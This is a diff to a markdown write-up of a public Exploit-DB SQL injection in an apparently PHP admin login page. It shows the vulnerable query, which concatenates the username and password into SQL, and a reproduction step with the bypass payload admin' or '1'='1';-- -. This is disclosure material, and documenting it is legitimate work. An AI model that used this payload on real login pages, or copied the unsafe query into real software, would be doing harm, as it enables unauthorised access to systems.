@@ -11,9 +11,12 @@ original link: https://www.exploit-db.com/exploits/50966
 ```
 
 ## Vulnerable code
-line 9 in file "/oahms/admin/login.php"
+line 9 in file `"/oahms/admin/login.php"`
+```php
+[SNIP]
 $ret=mysqli_query($con,"SELECT ID FROM tbladmin WHERE UserName='$username' and Password='$password'");
-
+[SNIP]
+```
 ## Steps of reproduce:
 1. Go to the admin login page http://localhost/oahms/admin/login.php
 2. sqli payload:  admin' or '1'='1';-- -
